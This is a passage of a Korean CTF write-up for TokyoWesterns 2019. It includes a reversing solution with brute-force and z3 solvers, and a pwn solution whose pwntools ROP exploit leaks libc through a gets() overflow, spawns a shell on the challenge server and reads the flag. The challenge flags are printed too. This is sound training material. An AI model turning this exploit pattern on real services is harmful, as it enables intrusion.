위 코드를 여러 부분으로 나누어 분석해보았다. 전체적으로 중간에 exit() 되지 않고 흐름대로 진행만 되면 결국 플래그가 출력되는 로직이다. 플래그와 비교하는 것이 아니라 이 복잡한 로직에 `플래그를 넣어 나온 결과값`을 박아두었고, 이 결과값과 `사용자 입력을 로직으로 돌린 값`을 비교한다. 즉, 입력값이 곧 플래그가 되어야 한다.
### 영역1
```c
s = a2[1];
if ( strlen(a2[1]) != 39 )
{
  puts("incorrect");
  exit(0);
}
if ( memcmp(s, "TWCTF{", 6uLL) || s[38] != 125 )
{
  puts("incorrect");
  exit(0);
}
```
위 코드에서 a2[1]는 실행 파라미터고, s에 넣는다. 이 입력값은 39byte여야하며, `앞 6글자가 "TWCTF{", 뒤 1글자가 "}"` 이어야 로직을 통과한다.  

### 영역2
``` c
s1 = 0LL;
v38 = 0LL;
v39 = 0LL;
v40 = 0LL;
v41 = 0LL;
v42 = 0LL;
v43 = 0LL;
v44 = 0LL;
v46 = 3978425819141910832LL;
v47 = 7378413942531504440LL;
for ( i = 0; i <= 15; ++i )
{
  for ( j = strchr(s, *((char *)&v46 + i)); j; j = strchr(j + 1, *((char *)&v46 + i)) )
    ++*((_DWORD *)&s1 + i);
}
if ( memcmp(&s1, &unk_400F00, 0x40uLL) )
{
  puts("incorrect");
  exit(0);
}
```
v46은 string으로 `76543210`이고 v47은 `fedcba98`이다. 위 코드는 `0123456789abcdef`에서 한글자씩 for문을 돌면서 flag에 해당 문자가 몇개 존재하는지 세는 로직이다. 0부터 차례대로 s1부터 들어간다.  

이후 `unk_400F00`에 있는 데이터와 메모리 비교를 한다. `unk_400F00 3,2,2,0,3,2,1,3,3,1,1,3,1,2,2,3` 이와 같은 값이 들어있기 때문에 정리하면 다음과 같다.
``` python
count = {
  '0' : 3,
  '1' : 2,
  '2' : 2,
  '3' : 0,
  '4' : 3,
  '5' : 2,
  '6' : 1,
  '7' : 3,
  '8' : 3,
  '9' : 1,
  'a' : 1,
  'b' : 3,
  'c' : 1,
  'd' : 2,
  'e' : 2,
  'f' : 3
}
```

### 영역3
```c
for ( k = 0; k <= 7; ++k )
{
  v10 = 0;
  v11 = 0;
  for ( l = 0; l <= 3; ++l )
  {
    v5 = s[4 * k + 6 + l];
    v10 += v5;
    v11 ^= v5;
  }
  *((_DWORD *)&v21 + k) = v10;
  *((_DWORD *)&v25 + k) = v11;
}
```
`s[4k+6+l]`의 합을 v21부터, XOR 결과를 v25부터 DWORD(4Bytes) 단위로 주소값을 증가시키면서 대입한다.

### 영역4
```c
v29 = 0LL;
v30 = 0LL;
v31 = 0LL;
v32 = 0LL;
v33 = 0LL;
v34 = 0LL;
v35 = 0LL;
v36 = 0LL;
for ( m = 0; m <= 7; ++m )
{
  v14 = 0;
  v15 = 0;
  for ( n = 0; n <= 3; ++n )
  {
    v6 = s[8 * n + 6 + m];
    v14 += v6;
    v15 ^= v6;
  }
  *((_DWORD *)&v29 + m) = v14;
  *((_DWORD *)&v33 + m) = v15;
}
```
`s[8n+6+m]`의 합을 v29부터, XOR 결과를 v33부터 DWORD(4Bytes) 단위로 주소값을 증가시키면서 대입한다.

### 영역5
```c
if ( memcmp(&v21, &unk_400F40, 0x20uLL) || memcmp(&v25, &unk_400F60, 0x20uLL) )
{
  puts("incorrect");
  exit(0);
}
if ( memcmp(&v29, &unk_400FA0, 0x20uLL) || memcmp(&v33, &unk_400F80, 0x20uLL) )
{
  puts("incorrect");
  exit(0);
}
```
합과 XOR연산을 한 변수들을 메모리에 있는 어떤 값들과 비교한다.

### 영역6
```c
memset(v45, 0, sizeof(v45));
for ( ii = 0; ii <= 31; ++ii )
{
  v7 = s[ii + 6];
  if ( v7 <= 47 || v7 > 57 )
  {
    if ( v7 <= 96 || v7 > 102 )
      v45[ii] = 0;
    else
      v45[ii] = 128;
  }
  else
  {
    v45[ii] = 255;
  }
}
if ( memcmp(v45, &unk_400FC0, 0x80uLL) )
{
  puts("incorrect");
  exit(0);
}
```
flag를 for문으로 한글자씩 검사하는데, 이 글자가 "0123456789"인지, "abcdef"인지, 둘다 아닌지를 체크한다. 숫자라면 255를, 문자라면 128을, 둘다 아니라면 0을 v45부터 차례대로 넣는다.

### 영역7
```c
v18 = 0;
for ( jj = 0; jj <= 15; ++jj )
  v18 += s[2 * (jj + 3)];
if ( v18 != 1160 )
{
  puts("incorrect");
  exit(0);
}
```
`s[2*(jj+3)]` 의 합이 1160이면 로직을 통과할 수 있다.
### 영역8
```c
if ( s[37] != 53 || s[7] != 102 || s[11] != 56 || s[12] != 55 || s[23] != 50 || s[31] != 52 )
{
  puts("incorrect");
  exit(0);
}
```
위에서 지정한 인덱스에 해당 값이 들어가면 로직을 통과할 수 있다.

부끄럽지만 아래는 문제를 푼 페이로드다. `z3`나 `angr`를 사용하면 더 이쁘게 풀 수 있는것 같다.
```python
unk_400FC0 = [
  0x80, 0x80, 0x0FF, 0x80, 0x0FF, 0x0FF, 0x0FF, 0x0FF, 0x80, 0x0FF,
  0x0FF, 0x80, 0x80, 0x0FF, 0x0FF, 0x80, 0x0FF, 0x0FF, 0x80, 0x0FF,
  0x80, 0x80, 0x0FF, 0x0FF, 0x0FF, 0x0FF, 0x80, 0x0FF, 0x0FF, 0x0FF,
  0x80, 0x0FF
]


# base()
# ====================================

def inputData(flag):
  for i in range(6):
    flag[i] = "TWCTF{"[i]
  flag[7] = chr(102)
  flag[11] =chr(56)
  flag[12] =chr(55)
  flag[23] =chr(50)
  flag[31] =chr(52)
  flag[37] =chr(53)
  flag[38] =chr(125)
  return flag

def inputCorN(flag):
  n = "0123456789"
  c = "abcdef"
  for i in range(len(unk_400FC0)):
    if len(flag[6+i]) == 1:
      pass
    elif unk_400FC0[i] == 0x80:
      flag[6+i] = c
    else:
      flag[6+i] = n
  return flag

# check()
# ====================================
v21 = [0x15e, 0xda, 0x12f, 0x131, 0x100, 0x131, 0xfb, 0x102]
v25 = [0x52, 0xc, 0x1, 0xf, 0x5c, 0x5, 0x53, 0x58]
v29 = [0x129, 0x103, 0x12b, 0x131, 0x135, 0x10b, 0xff, 0xff]
v33 = [0x1, 0x57, 0x7, 0xd, 0xd, 0x53, 0x51, 0x51]

count = {
    '0':3, '1':2, '2':2, '3':0, '4':3, '5':2, '6':1, '7':3, '8':3, '9':1,
    'a':1, 'b':3, 'c':1, 'd':2, 'e':2, 'f':3
}

def checkCount(flag, max=38):
  for k, v in count.items():
    if list(flag.values())[:max+1].count(k) > v:
      return False
  return True

def checkSum(lst):
  s = 0
  for i in range(16):
    s += ord(lst[2*(i+3)])
  if s == 1160:
    return True
  return False

def checkSumXOR(flag):
  for i in range(8):
    s1, s2, x1, x2 = 0, 0, 0, 0
    for j in range(4):
      s1 += ord(flag[4*i+6+j])
      x1 ^= ord(flag[4*i+6+j])
      s2 += ord(flag[8*j+6+i])
      x2 ^= ord(flag[8*j+6+i])
    if s1 != v21[i] or x1 != v25[i] or s2 != v29[i] or x2 != v33[i]:
      return False
  return True


def checkSumXORmini(flag, i):
  s = 0
  x = 0
  for j in range(4):
    s += ord(flag[4*i+6+j])
    x ^= ord(flag[4*i+6+j])
  if s != v21[i] or x != v25[i]:
    return False
  return True



    
# ====================================

def analysis(flag, lst,result):
  if len(result) == 1:
    for i in range(4):
      if len(flag[i]) > 1:
        flag[lst[i]] = result[0][i]
  else:
    v = ["" for _ in range(4)]
    for r in result:
      for i in range(4):
        if r[i] not in v[i]:
          v[i] += r[i]
    for i in range(4):
      if len(flag[lst[i]]) > len(v[i]):
        flag[lst[i]] = v[i]
  return flag

def possible(flag, lst,pls,xor):
    res = []
    s = 0
    x = 0
    for i in flag[lst[0]]:
      for j in flag[lst[1]]:
        for k in flag[lst[2]]:
          for l in flag[lst[3]]:
            s = ord(i) + ord(j) + ord(k) + ord(l)
            x = ord(i) ^ ord(j) ^ ord(k) ^ ord(l)
            if s == pls and x == xor :
              res.append([i, j, k, l])
    return analysis(flag, lst, res)

def search(flag):
  for i in range(8):
    lst = [4*i+6, 4*i+7, 4*i+8, 4*i+9]
    flag = possible(flag, lst, v21[i], v25[i])
    lst = [6+i, 14+i, 22+i, 30+i]
    flag = possible(flag, lst, v29[i], v33[i])
  return flag


# ===========================

def isCorrect(flag):
  b = True
  if len("".join(flag.values())) != 39:
    b = False
  elif not checkSum(flag) or not checkCount(flag) or not checkSumXOR(flag):
    b = False
  return b

def base(flag):
  flag = inputData(flag)
  flag = inputCorN(flag)
  return flag

def deepFind(flag, deep):
  f = {k:v for k,v in flag.items()}
  for c in flag[deep]:
    f[deep] = c
    if deep == 38:
      if isCorrect(f):
        print("".join(flag.values()))
        exit()
    else:
      if not checkCount(f, deep):
        continue
      elif deep >= 9 and (deep-9)%4 == 0 and not checkSumXORmini(f, (deep-9)//4):
        continue
      deepFind(f, deep+1)


def find(flag):
  deepFind(flag, 0)
  return flag

def main():
  flag = base({i:"0123456789abcdef" for i in range(39)})
  flag = search(flag)
  flag = find(flag)

if __name__ == '__main__':
  main()
```

`z3` 모듈을 사용하면 아래와 같은 아름다운 코드로 문제를 풀어낼 수 있다.
```python
#-*-coding:utf-8-*-
from z3 import *
check1=[3,2,2,0,3,2,1,3,3,1,1,3,1,2,2,3]
check2=[0x15e,0xda,0x12f,0x131,0x100,0x131,0xfb,0x102]
check3=[0x52,0xc,0x1,0xf,0x5c,0x5,0x53,0x58]
check4=[0x129,0x103,0x12b,0x131,0x135,0x10b,0xff,0xff]
check5=[0x1,0x57,0x7,0xd,0xd,0x53,0x51,0x51]
check6=[0x80,0x80,0xff,0x80,0xff,0xff,0xff,0xff,0x80,0xff,0xff,0x80,0x80,
        0xff,0xff,0x80,0xff,0xff,0x80,0xff,0x80,0x80,0xff,0xff,0xff,0xff,0x80,
        0xff,0xff,0xff,0x80,0xff]

# 비트벡터로 flag 배열 39자리 선언
flag=[BitVec(i,8) for i in range(39)]

# 해를 구하는 Solver 객체 생성
s=Solver()

# ========================

s.add(flag[0]==ord('T'))
s.add(flag[1]==ord('W'))
s.add(flag[2]==ord('C'))
s.add(flag[3]==ord('T'))
s.add(flag[4]==ord('F'))
s.add(flag[5]==ord('{'))
s.add(flag[38]==ord('}'))
index=0

# =========================

for i in "0123456789abcdef":
        cnt=0
        for j in flag:
                # 조건문 자체가 Solver의 조건이 되기 때문에
                # z3의 If 메소드를 사용
                cnt+=If(j==ord(i),1,0)
        s.add(cnt==check1[index])
        index+=1

# ==========================

for i in range(0,8):
        tmp1=0
        tmp2=0
        for j in range(0,4):
                tmp1+=flag[4*i+6+j]
                tmp2^=flag[4*i+6+j]
        s.add(tmp1==check2[i])
        s.add(tmp2==check3[i])

# ==========================

for i in range(0,8):
        tmp1=0
        tmp2=0
        for j in range(0,4):
                tmp1+=flag[8*j+6+i]
                tmp2^=flag[8*j+6+i]
        s.add(tmp1==check4[i])
        s.add(tmp2==check5[i])

# ==========================

for i in range(0,32):
        if(check6[i]==0x80):
                s.add(flag[i+6] > 96)
                s.add(flag[i+6] <= 102)
                # z3의 And 메소드를 사용하면
                # 아래와 같이 구현도 가능
                # s.add(And(flag[i+6]>96,flag[i+6]<=102))
        elif(check6[i]==0xff):
                s.add(And(flag[i+6]>47,flag[i+6]<=57))

# ===========================

summ=0
for i in range(0,16):
        summ+=flag[2*(i+3)]
s.add(summ==1160)
s.add(flag[37]==ord('5'))
s.add(flag[7]==ord('f'))
s.add(flag[11]==ord('8'))
s.add(flag[12]==ord('7'))
s.add(flag[23]==ord('2'))
s.add(flag[31]==ord('4'))

# =============================

print(s.check())
m=s.model()

print("".join([chr((m[i].as_long())) for i in m]))
```
아름다운 `z3` 코드의 출처 : [CAT-Security](https://github.com/goseungduk/CTF_WriteUp/tree/master/TokyoWesterns_2019/reverse/easy_crack_me)  

## Flag
`TWCTF{df2b4877e71bd91c02f8ef6004b584a5}`

# nothing more to say
## Problem
Japan is fucking hot.  
  
nc nothing.chal.ctf.westerns.tokyo 10001  
  
[warmup.c](https://score.ctf.westerns.tokyo/attachments/4/warmup-324b473c61799a01c8b14f63c559ff408a9756a738198c5026735161a7608afa.c)  
[warmup](https://score.ctf.westerns.tokyo/attachments/4/warmup-b8fa17414a043a62ba16fdeb4f82051d35fc6f434f7130d6d988d6c2d312e73e)

## Play
문제의 소스코드는 아래와 같다.
```c
// gcc -fno-stack-protector -no-pie -z execstack  warmup.c -o warmup
#include <stdio.h>

void init_proc() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
}


int main(void) {
    char buf[0x100];
    init_proc();
    puts("Hello CTF Players!\nThis is a warmup challenge for pwnable.\nWe provide some hints for beginners spawning a shell to get the flag.\n\n1. This binary has no SSP (Stack Smash Protection). So you can get control of instruction pointer with stack overflow.\n2. NX-bit is disabled. You can run your shellcode easily.\n3. PIE (Position Independent Executable) is also disabled. Some memory addresses are fixed by default.\n\nIf you get stuck, we recommend you to search about ROP and x64-shellcode.\nPlease pwn me :)");
    gets(buf);
    printf(buf);
    return 0;
}
```
`gets(buf)`에서 buf 변수에 Overflow 할 수 있는 취약점이 존재한다.
```python
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
#x = process("warmup")
x = remote("nothing.chal.ctf.westerns.tokyo",10001)
#x = process(["strace","-if","./warmup"])
elf = ELF("warmup")
libc = elf.libc
rop = ROP(elf)
rop2 = ROP(elf)

#==========
main = 0x4006ba

#================
rop.raw("a"*0x108)
rop.puts(elf.got['puts'])
rop.raw(main)

print rop.dump()

def overflow(ex):
    x.recvuntil("pwn me :)\n")
    x.sendline(ex)

overflow(rop.chain())

#====================
x.recvuntil("\x73\x07\x40")
putsaddr = u64(x.recv(6)+"\x00\x00")
log.info(hex(putsaddr))

libcbase = putsaddr - libc.symbols['puts']
log.info(hex(libcbase))

oneshot = libcbase + 0x4f2c5

#==================
rop2.raw("a"*0x108)
rop2.raw(oneshot)
#================
overflow(rop2.chain())
print rop2.dump()
x.interactive()
```
```bash
[+] Opening connection to nothing.chal.ctf.westerns.tokyo on port 10001: Done
[*] '/mnt/d/tctf/pwn/warmup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded cached gadgets for 'warmup'
0x0000:       'aaaaaaaa' 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
0x0008:       'aaaaaaaa'
0x0010:       'aaaaaaaa'
0x0018:       'aaaaaaaa'
0x0020:       'aaaaaaaa'
0x0028:       'aaaaaaaa'
0x0030:       'aaaaaaaa'
0x0038:       'aaaaaaaa'
0x0040:       'aaaaaaaa'
0x0048:       'aaaaaaaa'
0x0050:       'aaaaaaaa'
0x0058:       'aaaaaaaa'
0x0060:       'aaaaaaaa'
0x0068:       'aaaaaaaa'
0x0070:       'aaaaaaaa'
0x0078:       'aaaaaaaa'
0x0080:       'aaaaaaaa'
0x0088:       'aaaaaaaa'
0x0090:       'aaaaaaaa'
0x0098:       'aaaaaaaa'
0x00a0:       'aaaaaaaa'
0x00a8:       'aaaaaaaa'
0x00b0:       'aaaaaaaa'
0x00b8:       'aaaaaaaa'
0x00c0:       'aaaaaaaa'
0x00c8:       'aaaaaaaa'
0x00d0:       'aaaaaaaa'
0x00d8:       'aaaaaaaa'
0x00e0:       'aaaaaaaa'
0x00e8:       'aaaaaaaa'
0x00f0:       'aaaaaaaa'
0x00f8:       'aaaaaaaa'
0x0100:       'aaaaaaaa'
0x0108:         0x400773 pop rdi; ret
0x0110:         0x601018 [arg0] rdi = got.puts
0x0118:         0x40054c puts
0x0120:         0x4006ba main
[*] 0x7f1c2e5869c0
[*] 0x7f1c2e506000
0x0000:       'aaaaaaaa' 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
0x0008:       'aaaaaaaa'
0x0010:       'aaaaaaaa'
0x0018:       'aaaaaaaa'
0x0020:       'aaaaaaaa'
0x0028:       'aaaaaaaa'
0x0030:       'aaaaaaaa'
0x0038:       'aaaaaaaa'
0x0040:       'aaaaaaaa'
0x0048:       'aaaaaaaa'
0x0050:       'aaaaaaaa'
0x0058:       'aaaaaaaa'
0x0060:       'aaaaaaaa'
0x0068:       'aaaaaaaa'
0x0070:       'aaaaaaaa'
0x0078:       'aaaaaaaa'
0x0080:       'aaaaaaaa'
0x0088:       'aaaaaaaa'
0x0090:       'aaaaaaaa'
0x0098:       'aaaaaaaa'
0x00a0:       'aaaaaaaa'
0x00a8:       'aaaaaaaa'
0x00b0:       'aaaaaaaa'
0x00b8:       'aaaaaaaa'
0x00c0:       'aaaaaaaa'
0x00c8:       'aaaaaaaa'
0x00d0:       'aaaaaaaa'
0x00d8:       'aaaaaaaa'
0x00e0:       'aaaaaaaa'
0x00e8:       'aaaaaaaa'
0x00f0:       'aaaaaaaa'
0x00f8:       'aaaaaaaa'
0x0100:       'aaaaaaaa'
0x0108:   0x7f1c2e5552c5
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaRU.\x1c\x7f$
$ ls
flag
warmup
$ cat flag
TWCTF{AAAATsumori---Shitureishimashita.}
$    
```
## Flag
`TWCTF{AAAATsumori---Shitureishimashita.}`

